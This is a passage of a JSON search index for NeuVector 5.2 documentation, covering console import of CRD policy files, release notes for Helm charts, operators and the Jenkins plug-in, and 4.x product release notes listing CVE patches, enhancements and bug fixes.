log of major changes in releases.","keywords":"","version":"5.2"},{"title":"Importing CRD from Console","type":0,"sectionRef":"#","url":"/5.2/policy/usingcrd/import","content":"","keywords":"","version":"5.2"},{"title":"Importing a CRD format file from the Console or API​","type":1,"pageTitle":"Importing CRD from Console","url":"/5.2/policy/usingcrd/import#importing-a-crd-format-file-from-the-console-or-api","content":" NeuVector supports importing a CRD formatted file from the console. However, this is not the same as applying it in Kubernetes as a custom resource definition (CRD).  A file in the NeuVector CRD format can be imported via the console in order to set the security policy (rules) specified in the file. These rules will NOT be imported as 'CRD' designated rules, but as regular 'user created' rules. The implication is that these rules can be modified or deleted like other rules, from the console or through the API. They are not protected as CRD rules from modification.  To import from the console, go to Policy -&gt; Groups and select Import Policy Group.  important Imported rules will overwrite any existing rules for the Group.  Rules that are set using the Kubernetes CRD functions, e.g. through 'kubectl apply my_crd.yaml' create CRD type rules in NeuVector which cannot be modified through the console or API. These can only be modified by updating the crd file and applying the change through Kubernetes.  Possible use cases for console import of the rules file include:  Initial (one-time) configuration of rules for a Group or groupsMigration of rules from one environment to anotherRule creation where modification is required to be allowed from the console or API. ","version":"5.2","tagName":"h3"},{"title":"Integrations & Other Components","type":0,"sectionRef":"#","url":"/5.2/releasenotes/other","content":"","keywords":"","version":"5.2"},{"title":"Release Notes for Integration Modules, Plug-Ins, Other Components​","type":1,"pageTitle":"Integrations & Other Components","url":"/5.2/releasenotes/other#release-notes-for-integration-modules-plug-ins-other-components","content":" Github Actions​  Github actions for vulnerability scanning now published at https://github.com/neuvector/neuvector-image-scan-action.  Helm Chart 1.8.9​  Helm chart v1.8.9 is published for 5.0.0 deployments. If using this with the preview version of 5.0.0 the following changes should be made to values.yml: Update the registry to docker.ioUpdate image names/tags to the preview version on Docker hubLeave the imagePullSecrets empty  Splunk App Published​  New Splunk app for NeuVector is published at https://splunkbase.splunk.com/app/6205/  Helm Chart Update 1.8.7​  Support affinity and toleration customization for controller, scanner and manager.Add nodeSelector support for Controller, Manager, Scanner, updater pods.Support user-defined environment variables for controller container.  Community Operator v1.2.7 for Helm Chart 1.8.2​  Allow users to specify NeuVector release versionDeploys latest scanner CVE db versionContainer operator image location moved to registry.neuvector.com/publicNeuVector instance name defaults to neuvector (before it was example-neuvector)Updated readme document on install page and added link to release notes  Helm Chart 1.8.2​  Add controller ingress and route host options.  Certified Operator v1.2.8 for NeuVector v4.3.1​  Supports helm chart version 1.8.2Deploys NeuVector version 4.3.1Deploys scanner db version 2.360other changes from previous 1.2.7 version neuvector instance name defaults to neuvector, before it was example-neuvectorupdated readme document on install pagecorrected NeuVector logo display issue Known issues upgrading from 1.2.7 to 1.2.8 does not upgrade scanner db work around: update scanner image to registry.connect.redhat.com/neuvector/scanner@sha256:a802c012eee80444d9deea8c4402a1d977cf57d7b2b2044f90c9acc0e7ca3e06 on scanner deploymentreadme document on install page not aligned properlyscanner db is not updated by updater  Helm Chart update 1.8.0 July 2021​  Helm Chart v1.8.0 is updated to default to registry.neuvector.com as the default registry. NOTE: Must specify the version tag manually.Add configurable parameters such as Controller API annotations in Helm chart. Available from version 1.7.6+.Community Operator 1.2.6, Certified Operator 1.2.7 updated to reflect Helm chart updates including adding OpenShift route when controller.apisvc.type is enabled.  Other Integrations July 2021​  Add HTML output format for scan results in Jenkins pipeline scanning results.Add namespace of impacted workload in Prometheus exporter alerts. Now supported in neuvector/prometheus-exporter:4.2.2 and later.  Helm Chart update 1.7.5 May 2021​  Support changes required for new image registry registry.neuvector.com. Change to this will result in image paths (ie remove neuvector from path from neuvector/controller to controller).  Helm Chart update 1.7.2 April 2021​  Add support for separate component resources requests and limits, e.g. Controller, Enforcer cpu, memory requests.  Jenkins Plug-In Update v1.13 April 2021​  Fix the scan error that exists when multiple scanners are running at the same time.Show the Red Hat vulnerability rating in the scan result for Red Hat based images.  Operator Updates April 2021​  OpenShift operator/helm to be able to replace self-signed certificates. Helm Chart is 1.7.1. Community Operator is 1.2.4, and Certified Operator is 1.2.3.  Jenkins Plug-In v1.12 March 2021​  Overwrite vulnerability severity by score. Be able to edit what vulnerability (CVE) score range is used for High and Medium classifications. This enables customizing what score can be used to fail builds in the pipeline.Add error messages to the JAVA exceptions hudson.AbortException. Enable better error message reporting from NeuVector when an error occurs.  Update Helm Chart to 1.7.1 March 2021​  Add manager service loadbalancer ip and annotations.Add setting to set pvc capacity.Add runtime socket settings for k3s and AWS bottlerocket.Add settings to replace controller and manager certificates.  Scanner February 2021​  Fix CVE-2020-1938 not discovered during scan in scanner versions 1.191 and earlier. Update to latest scanner version after 1.191.  Jenkins Plug-In v1.11 February 2021​  Enhancements​  Add support for deploying the stand alone NeuVector scanner. This does not require a controller and must be deployed on the same host as the Jenkins installation. Docker must also be installed on the host. Currently, only the Linux version of Jenkins is supported (not container version). Also, add jenkins user to the docker group.  sudo usermod -aG docker jenkins   References:https://plugins.jenkins.io/neuvector-vulnerability-scanner/https://github.com/jenkinsci/neuvector-vulnerability-scanner-plugin/releases/tag/neuvector-vulnerability-scanner-1.11  Rancher Catalog Updates January 2021​  Update NeuVector in Rancher catalog to support 4.x  Helm Chart Updates January 2021​  Create required NeuVector CRDs upon deploymentFix error when setting controller ingress to true  Operator Updates January 2021​  Update Operators (community, certified) to support 4.x  Helm Chart Changes December 2020​  Allow user to customize PriorityClass of the manager/controller/enforcer/scanner deployment. We suggest to give NeuVector containers higher priority to make sure the security policies get enforced when the node resource is under pressure or during a cluster upgrade process.  Important Helm Chart Update November 2020​  Important: Changes to Helm Chart Structure  The directory for the NeuVector chart has changed from ./neuvector-helm/ to ./neuvector-helm/charts/core/  If using Helm to upgrade, please update the location to the path above. ","version":"5.2","tagName":"h3"},{"title":"Reporting","type":0,"sectionRef":"#","url":"/5.2/reporting","content":"Reporting Reporting and Notifications","keywords":"","version":"5.2"},{"title":"4.x Release Notes","type":0,"sectionRef":"#","url":"/5.2/releasenotes/4x","content":"","keywords":"","version":"5.2"},{"title":"Release Notes for 4.x​","type":1,"pageTitle":"4.x Release Notes","url":"/5.2/releasenotes/4x#release-notes-for-4x","content":" 4.4.4-s3 Security Patch April 2022​  Update all images to remediate high CVE-2022-28391 in busybox (alpine).  4.4.4-s2 Security Patch March 2022​  Update to remediate CVE-2022-0778, an OpenSSL vulnerability found in the Alpine base image used by NeuVector images. Short description: It is possible to trigger an infinite loop by crafting a certificate that has invalid elliptic curve parameters. Since certificate parsing happens before verification of the certificate signature, any process that parses an externally supplied certificate may be subject to a denial of service attack. More details can be found at the following links. https://security.alpinelinux.org/vuln/CVE-2022-0778https://www.suse.com/security/cve/CVE-2022-0778.htmlhttps://nvd.nist.gov/vuln/detail/CVE-2022-0778  4.4.4-s1 Security Patch February 2022​  Update alpine in Manager to remove recent CVEs including High ratings CVE-2022-25235, CVE-2022-25236 and CVE-2022-25314Note: Recent CVEs have also been published in the Manager CLI module related to the python package. The python package will be replace in the 5.0 version with python3 to remove any CVEs. This is currently scheduled for GA in May 2022. The CLI is not remotely accessible and can't be accessed through the GUI, so proper Kubernetes RBACs to restrict 'kubectl exec' commands into the Manager pod will protect against exploits.List of manager 4.4.4 CVEs alpine:3.15.0 High CVE-2022-25235 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25235 expatalpine:3.15.0 High CVE-2022-25236 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25236 expatalpine:3.15.0 Medium CVE-2022-25313 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25313 expatalpine:3.15.0 High CVE-2022-25314 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25314 expatalpine:3.15.0 High CVE-2022-25315 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25315 expatalpine:3.15.0 Medium CVE-2020-26137 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26137 usr/lib/python2.7/site-packages/urllib3-1.25.3alpine:3.15.0 High CVE-2020-7212 https://github.com/advisories/GHSA-hmv2-79q8-fv6g usr/lib/python2.7/site-packages/urllib3-1.25.3alpine:3.15.0 High CVE-2021-33503 https://github.com/advisories/GHSA-q2q7-5pp4-w6pg usr/lib/python2.7/site-packages/urllib3-1.25.3alpine:3.15.0 Medium CVE-2021-3572 https://github.com/advisories/GHSA-5xp3-jfq3-5q8x usr/lib/python2.7/site-packages/pip-20.3.4  Other Updates February 2022​  Update Helm chart to 1.9.1. Allow users to specify different image SHA hash instead of tags, add support for k3s in Rancher UI.Community Operator is updated to 1.3.5 to support 4.4.4.Certified Operator is updated to to 1.3.2 to support 4.4.4.  4.4.4 February 2022​  Enhancements​  Add environment variable for Enforcer to turn off secrets scanning, which in some environments can consume resources. Set to ENF_NO_SECRET_SCANS=1In Vulnerability Explorer &gt; CSV download, show affected containers in multiple rows instead of in the same cell.  Bug Fixes​  Reduce secrets scanning by Enforcer to avoid possibility of long running scanning tasks which can consume memory. This may be caused by large image registry or database scan locally.Fix bug when attempting to export CSV for CVE's found in the vulnerability explorer Security Risks -&gt; Vulnerabilities without using filter, the CSV file is empty.Fix timing issue when upgrading from 4.2.2 which can result in implicit deny for all traffic. Most recent fix is related to XFF settings during rolling updates.  Other​  Allow users to specify different image SHA hash instead of tags https://github.com/neuvector/neuvector-helm/pull/140. Will be propagated to Operator.  4.4.3 January 2022​  Enhancements​  Replace the self-signed certificate for Manager which is expiring January 23, 2022 with new one expiring Jan. 2024.Improve ability to display unmanaged workloads in Network Activity map which are not relevant.  Bug Fixes​  Fix Controller crashes when scanning gitlab registry.Admission control not blocking for some images. This is because a vulnerability found in multiple packages is treated as 1 vulnerability in Controller's admission control and is fixed.Upgrade from 4.2.2 to 4.3.2 results in implicit deny for all traffic if high traffic during rolling upgrade.  Other​  Helm chart v1.8.9 is published for 5.0.0 deployments.  4.4.2 December 2021​  Enhancements​  Add support for scanning embedded java jars and jars without Maven file, for example log4j-core-2.5.jar, when pom.xml doesn’t exist.Add CVE database source of GitHub advisories for Maven, starting with scanner/CVE db version 2.531.Rest API reference doc is updated to 4.4.1 and 4.4.2.  Bug Fixes​  Fix memory leak detected in Enforcer.  4.4.1 December 2021​  Enhancements​  Add support for cgroup v2, which is required for some environments such as SUSE Linux Enterprise Server 15 SP3.  Bug Fixes​  Fix the issue where Enforcer is unable to detect CVE-2021-44228 in running containers.Reduce/fix high memory usage by Enforcer for some environments.Fix an issue with import/export of nv.ip group policy.Fix issue with removing a group with no container members.Fix issue of can't login using neuvector-prometheus-exporter intermittently.Fix issue with REST API endpoint /v1/response/rule?scope=local not deleting all response rules.  Helm Chart Update 1.8.7​  Support affinity and toleration customization for controller, scanner and manager.Add nodeSelector support for Controller, Manager, Scanner, updater pods.Support user-defined environment variables for controller container.  Splunk App Published​  New Splunk app for NeuVector is published at https://splunkbase.splunk.com/app/6205/  4.4.0 December 2021​  Enhancements​  Add ability to 'Accept' a vulnerability (CVE) to exclude it from reports, views, risk scoring etc. A vulnerability can be selected and the Accept button clicked from several screens such as Security Risks -&gt; Vulnerabilities, Assets -&gt; Containers etc. Once accepted, it is added to the Security Risks -&gt; Vulnerability Profile list. It can be viewed, exported, and edited here. Note that this Accept feature can be limited to listed Images and/or Namespaces. New entries can also be added manually to this list from this screen.Enable a Configuration Assessment of a kubernetes deployment yaml file. Upload a yaml file from Policy -&gt; Admission Control and it will be reviewed against all Admission Control rules to see if it will hit any rules. A report of the assessment can be downloaded from this window.  Bug Fixes​  Fixed packet capture is not available for pod with istio sidecar proxy.Remove writing by Allinone to /dev/null.json  4.3.2-s1 November 2021​  Security patch release that addresses vulnerabilities in 'curl' related libraries discovered in the 4.3.2 release. The discovered CVE are CVE-2021-22945, CVE-2021-22946 and CVE-2021-22947.  4.3.2 September 2021​  Enhancements​  Support Openshift CIS benchmark 1.0.0 and 1.1.0.Support admission control dry-run option.Improve description of the source of admission control criteria. Improve labels criteria in admission control to add other criteria.Support gitlab cloud (SaaS) registry scan.Support multi-architecture image scan.ConfigMap override option to reset config whenever controller starts. The 'always_reload: true' can be used in any configMap yaml to force reload of that yaml every time the controller starts.Include pre-built PSP best practices admission control rules.Test support for AppArmor profile for running NeuVector as non-privileged containers.Allow users to click Group name in Security events list to go to the Policy -&gt; Groups selection.  Bug Fixes​  Add indicator for admission control criterion to determine if scan result is required.Warning if all NeuVector components are not running the same version.Show Docker Swarm/Mirantis platform in Network Activity -&gt; View -&gt; Show System. This is enabled by adding the environment variable for the Enforcer NV_SYSTEM_GROUPS.  Other​  Update cronjob version in helm chart (v. 1.8.3).Support Jenkins master-slave configuration in Jenkins plug-in.  4.3.1 August 2021​  Enhancements​  Display node labels under Assets -&gt; Nodes.Display statistics for the Controller in Assets -&gt; System ComponentsReport if a vulnerability is in the base image layers in image scan when using the REST API to scan images. The base image must be identified in the api call, as in the example below.  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;https://registry.hub.docker.com/&quot;, &quot;repository&quot;: &quot;garricktam/debian&quot;, &quot;tag&quot;: &quot;latest&quot;, &quot;scan_layers&quot;: false, &quot;base_image&quot;: &quot;2244...../nodejs:3.2......&quot;}}' &quot;https://$RESTURL/v1/scan/repository&quot; {noformat}   Limitations: If the image to be scanned is a remote image, with &quot;registry&quot; specified, the base image must also be a remote image, and the name must start with http or https.If the image to be scanned is a local image, then the base image must also be a local image as well. For example,  {&quot;request&quot;: {&quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.2&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;alpine:3.12.0&quot;}} {&quot;request&quot;: {&quot;registry&quot;: &quot;https://10.1.127.12:5000/&quot;, &quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.0&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;https://registry.hub.docker.com/alpine:3.12.0&quot;}} {&quot;request&quot;: {&quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.2&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;10.1.127.12:5000/neuvector/manager:4.0.2”}}   Bug Fixes​  Make enforcer list height adjustable.Sanitize all displayed fields to prevent XSS attacks.  4.3 July 2021​  Enhancements​  New Network Activity display in console improved performance and object icon design. New UI framework dramatically improves loading times for thousands of objects to be displayed. Session filters are maintained until logout in Network Activity, Security Risks and other menu's. GPU acceleration is enabled, which can be disabled if this causes display issues. Note: Known issue with certain Window's PCs with GPU enabled.Add ability to import Group Policy (CRD file yaml format) from console to support non-Kubernetes environments. Important: Imported CRDs from console do NOT get classified and displayed as CRD rules. They can be edited through the console, unlike CRD's applied through Kubernetes.Support multiple web hook endpoints. In Settings -&gt; Configuration, multiple web hook endpoints can be added. In Response Rules, creating a rule enables user to select which end point(s) to notify by web hook.Support (multiple web hook) configuration in Federated rules.Support JSON format for web hooks. Can now configure JSON, key-value pairs, or Slack as web hook formats when creating a web hook.Support custom user roles for map to a namespace user. Directory integration support mapping of groups to roles, with role being able to limit to namespace(s). Limitation: If the user is in multiple groups, the role will be 'first matched' group's role assigned. Please the order of configuration for proper behavior.Download list of external IPs for egress connections. Added ability to download report/CSV from the Dashboard page under section Ingress and Egress Exposure.Support cve-medium criteria in Response Rules.Add preconfigured PSP Best Practice rule to Admission Control rules. For example the following preset criteria can alert/block a deployment: Run as Privileged, Run as Root, Share host's IPC Namespaces = true, Share host's Network = true, Share host's PIC Namespaces = true.Support using Namespace in Advanced Filter for Security Risks Vulnerabilities &amp; Compliance for Assets report in PDF.Support Admission Control rule criteria based on CVE score.Add a Test Registry button when configuring registry scanning for registries that support this feature such as docker and JFrog.Improve support log download and controller debug settings. Enable download settings such as cPath and which component logs are downloaded.Add support for Kubernetes 1.21.  Bug Fixes​  Support Kubernetes 1.21 with containerd 1.4.4. The containerd run-time v1.4.4 changes its cgroup representations.Scanner identifies OS as ol:7.9 with false positive CVEs.Support standalone scanner deployment on Azure DevOps extension.  Other Changes​  Helm Chart v1.8.0 is updated to default to registry.neuvector.com as the default registry. NOTE: Must specify the version tag manually.Add configurable parameters such as Controller API annotations in Helm chart. Available from version 1.7.6+.Community Operator 1.2.6, Certified Operator 1.2.7 updated to reflect Helm chart updates including adding OpenShift route when controller.apisvc.type is enabled. The certified Operator 1.2.7 deploys NeuVector version 4.2.2.Add HTML output format for scan results in Jenkins pipeline scanning results.Add namespace of impacted workload in Prometheus exporter alerts. Now supported in neuvector/prometheus-exporter:4.2.2 and later.  4.2.2 April 2021​  Enhancements​  Enable enforcement of a password policy. If this feature is enabled, passwords must meet minimum security requirements configured. Go to Settings - User/Roles to set the password policy, including minimum characters, upper case, numeric, and special characters required. Guessing and password reuse are also prevented.Allow slash in key/value in CRD group definition.Enhance SAML to support CAC authentication. SAML AFDS Common Access Card (CAC) authentication method.Verify compatibility with OpenShift 4.7  Bug Fixes​  Fix the condition where Enforcer is delaying node reboot for up to 20 minutes on OpenShift update.Correct Unmanaged node terminology to be 'nodes'.CRD import produced unexpected results. A conversion tool is available from NeuVector to help convert from previous releases CRD format.In AKS webhook certificates created without SAN for k8s v1.19+.Federated policy working inconsistently and not as expected. Improve unmanaged workload ip logic to reduce unnecessary violations.  4.2.1 March 2021​  Bug Fixes​  Predefined File Access rules are not displaying in console.Column headers are incorrect in several console views such as Assets-&gt;Registry-&gt;Module Scan Results. Some PDF reports were also affected and have been fixed. Other areas primarily in Sonatype build have been fixed.  4.2 March 2021​  Enhancements​  Multi-cluster Monitoring. Centralized visibility of the security posture of all managed clusters, by displaying the risk score and cluster summary for each cluster on multi-cluster management page. Note: multi-cluster federation requires a separate license.Add support for IBM Cloud integrated usage-based billing.Enhance PCI compliance report to show asset view , listing vulnerabilities by service.Add summary of scan result before listing the vulnerability.Support Red Hat OVAL2 database required for Red Hat Vulnerability Scanner certification.Support Red Hat OpenShift beta version of CIS benchmarks ('inspired by CIS'). This will be finalized when the CIS.org publishes the official version. This feature is supported for deployments of OpenShift version 4.3+.Allow API query filtering to check for conditions such as images allowed or denied using API calls.Add support for CIS Kubernetes benchmark 1.6.0.Report and display Image Modules detected during scan in scan results. This is shown in a tab in Image Scan results, and included in scan results from REST API.Allow editing of filters in registry, group, and response rule configurations through console.Update ConfigMap to add group_claim in oidcinitcfg.yaml and samlinitcfg.yaml, and Xff_Enabled in sysinitcfg.yamlAPI's yaml is updated for 4.2 in Automation section.  Bug Fixes​  Enforcer is unable to join existing cluster, sometimes taking 10 minutes in cases where there are too many enforcers registered. This is when enforcers are terminated ungracefully but still registered for license checks, preventing other enforcers from joining when the license limit is reached.Fixed: wildcard DNS traffic blocked. Improved the caching of dns results matching to wildcard dns address group.Fix rare condition where CRD certificates gets out of sync for webhook and controller.Correct legend in Network Activity display for 'Unmanaged' to 'Nodes'.Nodes detected as workload resulting in implicit violations.  Other​  Jenkins Plugin enhancements: Overwrite vulnerability severity by score.Add error messages to the JAVA exceptions hudson.AbortException. Update Helm chart to 1.7.1.  Please see release notes section Integrations &amp; Other Components for details.  4.1.2 February 2021​  Enhancements​  Enable toggling for XFF-forwarding to disable the NeuVector policy from using it, which is enabled by default. This is related to a function added in 4.1.1 to add support for x-forwarded-* headers. To disable, go to Settings -&gt; Configuration. IMPORTANT: See the detailed description of the behavior of XFF-FORWARDED-FOR below.  Bug Fixes​  Fixed that CVE-2020-1938 is not detected.Fix error from Manager &quot;Failed to export configurations of section {policy, user, config}.&quot;Fix Network Activity Graph filter is not working.Improve controller CPU and memory consumption.  Other​  Jenkins plug-in updated to support stand alone scanner. Please see release notes section Integrations &amp; Other Components for details.  XFF-FORWARDED-FOR Behavior Details​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;  Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. In 4.1.0 release, we added a feature to recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  In 4.1.2, switch is added to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.    4.1.1 January 2021​  Bug Fixes​  Add support for AWS EKS AMI Release v20210112 to fix ulimit issues.  4.1 December 2020​  Enhancements​  Allow users to change policy mode when exporting CRD.OIDC support claims from /oauth/userinfo endpoint.Cluster node refresh support to allow temporary support for node growth and migration of pods between nodes.Generate a usage report for download from the Settings -&gt; Configuration page.Wildcard support on namespace when assigning user roles to namespace.Improve group/policy removal logic. Configurable setting for when an unused group is removed based on the amount of time since it was last used.Allow user to configure packet capture duration.Add support for Multi-cluster management reader role.Stand alone scanner now submits scan result using REST API. See below for Scanner Details.Detect and block Man-in-the-middle attack reported in CVE-2020-8554.Add support for metered (usage based) licensing models.Remove step for creation of CRDs (e.g. NvSecurityRule) from the sample deployment yamls for Kubernetes and Openshift. This is not required (Controller will create these automatically). Helm deployment will also take care of these.  Bug Fixes​  Improve high memory usage on controller and enforcer.Error returned when trying to configure a registry filter. Allow wildcard be used any place in the repo/tag filter.Block policy not working as expected. Add support for x-forwarded-* headers. IMPORTANT: See the detailed description of the behavior of XFF-FORWARDED-FOR above as part of the 4.1.2 release notes.Helm Chart error when setting controller ingress to true.Unable to create add and save network rule, due to gateway timeout.Configmap examples are missing Group_Claim field. Added to configmap documentation.Process profile violation when terminating Controller pod.  Scanner Details​  Two additional environment variables are added in order to login to controller REST API. Users with CICD integration role can submit the results.  New Environment Variables: SCANNER_CTRL_API_USERNAME, SCANNER_CTRL_API_PASSWORD  Usage Example  docker run --name neuvector.scanner --rm -e SCANNER_REPOSITORY=ubuntu -e SCANNER_TAG=16.04 -e SCANNER_LICENSE=$license -e CLUSTER_JOIN_ADDR=10.1.2.3 CLUSTER_JOIN_PORT=32368 -e SCANNER_CTRL_API_USERNAME=username -e SCANNER_CTRL_API_PASSWORD=secret -v /var/run/docker.sock:/var/run/docker.sock -v /var/neuvector:/var/neuvector neuvector/scanner   Kubernetes 1.19+ and CRD Exports​  important To use an exported CRD with Kubernetes 1.19+, please remove the 'version: v1' from each section. This can be found at the end or near the end of each section in an exported Group policy CRD.   version: v1   4.0.3 December 2020​  Bug Fixes​  Process profile violation occurring when terminating Controller pod.Implicit violations for user created address group which uses wildcard in hostnames.  Helm Chart Changes​  Allow user to customize PriorityClass of the manager/controller/enforcer/scanner deployment. We suggest to give NeuVector containers higher priority to make sure the security policies get enforced when the node resource is under pressure or during a cluster upgrade process.Create a separate chart for CRD. This allows CRD policies to be created before NeuVector core services are deployed. If the new chart is used, the CRD resources in the core chart, kept for backward compatibility, should be disabled with crdwebhook.enabled=falseAllow user to specify the service account for NeuVector deployment. Previously, the 'default' service account of the namespace is used. In the case when NeuVector is deployed together with other applications in a namespace, it is not advisable to use the default service account for the namespace for some users.  4.0.2 December 2020​  Enhancements​  Console - the container list page Assets -&gt; Containers should allow the window separators to be dragged to be resized.Add admission control checks for pod share host namespaces. Allow user to choose to prevent pod from sharing host's Network, IPC, PID namespaces. See below for more details.Ability to export list of containers running in privileged or 'runasroot'.In Notifications -&gt; Security Events, enable the display of information about the event attributes easily without switching screens.  Bug Fixes​  Issue with jumbo frames (enabled on some public clouds). Symptom: the main prometheus application URI /graph becomes inaccessible when the prometheus group is placed into Protect mode.Missing namespace option in vulnerabilities filter. Allow users to select/type the Namespace where NeuVector is installed as filter entry.False positive in OpenSSL version 1.1.1c-1 affected by CVE-2020-1967.Unexpected implicit deny violations for user created address group using wildcard hostnames. Problems with using DNS Name (with wildcards) for Firewall Traffic.Improve detection to remove SQL Injection false positive.  Admission Control for Pod Sharing​  HostPID - Controls whether the pod containers can share the host process ID namespace. Note that when paired with ptrace this can be used to escalate privileges outside of the container (ptrace is forbidden by default).HostIPC - Controls whether the pod containers can share the host IPC namespace.HostNetwork - Controls whether the pod may use the node network namespace. Doing so gives the pod access to the loopback device, services listening on localhost, and could be used to snoop on network activity of other pods on the same node.  4.0.1 November 2020​  important Changes to Helm Chart Structure The directory for the NeuVector chart has changed from ./neuvector-helm/ to ./neuvector-helm/charts/core/ If using Helm to upgrade, please update the location to the path above.  Enhancements​  Add support for distroless image scanning.Add ability to trigger single image scan from registry with results available for admission control.Update JFrog Xray integration to new JFrog platform api / authentication requirements.Add information about scanners in the Manager such as version and scanner statistics.Add quick filter to exclude security events (similar to grep -v).Update CVE Severity to align with NVD vulnerability severity ratings. Using the larger of the CVSS v2 and v3 scores, the ratings are High for &gt;=7, Medium for &gt;=4.Support standalone scanner deployments for local image scanning (does not require controller). Adds new environment variables SCANNER_LICENSE, SCANNER_REGISTRY, SCANNER_REPOSITORY, SCANNER_TAG, SCANNER_REGISTRY_USERNAME, SCANNER_REGISTRY_PASSWORD, SCANNER_SCAN_LAYERS, CLUSTER_JOIN_ADDR, CLUSTER_JOIN_PORT.Support namespace auto-complete for namespace user creation in Settings -&gt; Users.Add ability to enter exempted CVEs in the Jenkins scanner plug-in.Add admission control criteria to be able to block images for which the scan failed to detect the OS (e.g. archlinux images) and therefore no vulnerabilities were found. A new criteria &quot;Image Without OS information&quot; is added, when set to true, means the base OS of the image is unavailable.  Bug Fixes​  Improve (decrease) Controller memory usage.Enable support for webhook functions such as admission control and CRD in Kubernetes 1.19.Add support for apiextensions.k8s.io/v1 deployments as required for Kubernetes 1.19 (and supported in k8s 1.18).Unexpected process profile rule violation resulting from parent shell script for process on the allowed list.Add support for wildcard filters in Harbor registry (configured using Docker registry setting).Improve handling of configmap to re-load if admin password is reverted to the default. This is to prevent insecure access when the system is recovered from cluster level storage failure.  4.0.0.s1 October 2020​  Security Patch for NeuVector Containers​  This security release is for the NeuVector Manager and Allinone containers to address High CVE-2020-14363 found in the base Alpine layer in package libx11. As part of the update, Medium CVE-2020-8927 is also addressed. This issue, although unlikely to be able to be exploited, affects the Manager console for NeuVector and does not affect the operations of the Controller or Enforcer containers.  4.0 September 2020​  Enhancements​  Customizable compliance templates. Preset templates for PCI, GDPR, HIPAA, NIST. Each CIS benchmarks and custom check can be tagged with one or more compliance regulations. Reports can then be generated for each. Security Risks -&gt; Compliance Profile.Vulnerability Management Workflow Support. Track status of vulnerabilities and create policies based on vulnerability discovery dates and other criteria. Security Risks -&gt; Vulnerabilities (Advanced Filter), and Admission Control rules.Secrets auditing. 20+ secrets checks included, and automatically run on image scans and resource yamls. Results will show pass/warn in the compliance reports on image vulnerabilities in Assets -&gt; Registries and Security Risks -&gt; Compliance.Granular RBAC for NeuVector Users. Create custom roles with granular read/write permissions for NeuVector functions. Assign users to roles. Settings -&gt; Users/Roles.Scalable and Separated Scanner Pods. Scanner pods can be scaled up or down to scan thousands of images. The controller assigns scanning tasks to each available scanner pod. Important: the Controller no longer contains a scanner function, so a minimum of one scanner pod is required to be deployed. Also, the 4.x scanners are NOT backward compatible with 3.x controllers, 3.x deployments of external scanners should be updated to neuvector/scanner:3.Serverless Scanning and Risk Assessment for AWS Lambda. Scan AWS Lambda functions for vulnerabilities with the Serverless IDE Plug-in or in AWS accounts. Supported languages include Java, Python, Ruby, node.js. Perform risk assessment by evaluating IAM role permissions for Lambda functions and alert if unnecessary permissions are enabled. Note: Serverless security requires a separate NeuVector license.Perform compliance checks during image scanning. Also deployment yamls file. This includes setuid, setgid, CIS (running as root etc), 20+ secrets checks.Enhance Security Risk Score in Dashboard with ability to enable/disable which Groups contribute to the Risk Score. Policy -&gt; Groups -&gt; Scorable check box. This includes ability to disable system containers from risk scoring.Added support for a Namespace restricted user to have access to assigned registries.Break out scanning syslog notifications to individual CVE syslog events.Allow a namespace restricted user to be able to create registries that are only visible by users that have access to that namespace (including global users).Download pdf reports from the dashboard by namespace. Select a namespace to filter the dashboard pdf report.The CRD import behavior has been changed to ignore the PolicyMode of any 'linked' group, leaving the Policy mode unchanged if the linked group already exists. If the linked group does not exist it will be automatically created and set to the default New Services Mode in Settings -&gt; Configuration. A 'linked' group is one which has not been selected for export but is referred to by a network rule, and thus has been exported along with the selected group(s).  Bug Fixes​  Registry URL validation allows URL without protocol scheme prefix. Added protocol schema validation.Container scans failed - Fail to read files in some situations. Fixes error &quot;Failed to read file - error=&lt;nil&gt;&quot;.The Group member column is inaccurate for the special group &quot;nodes.&quot;Discount (reduce) Admission Controls (4 points) from Overall Risk Scoring for Docker EE Platform since it is not applicable.A scanner only controller can take 15-20 minutes to become ready.Security risks &gt; Vulnerabilities &quot;Severity&quot; Distribution title is mislabeled as Urgency.Security Events source Workload:ingress rule does not match. Unexpected implicit violation from Workload:Ingress on OpenShift 3.11 platform. Internal subnet logic is improved to handle large IP range.Enforcer reports error trying to connect to /var/run/docker.sock. Add recovery if connection is lost.  Summary of Major Operational Changes​  The 4.x Scanner is NOT compatible with the 3.2.0, 3.2.1, 3.2.2 Controllers. If you have deployed 3.x external scanners and wish to have them continue to run, be sure to UPDATE the scanner deployment with a version 3 tag, e.g. neuvector/scanner:3. Alternatively, you can update to 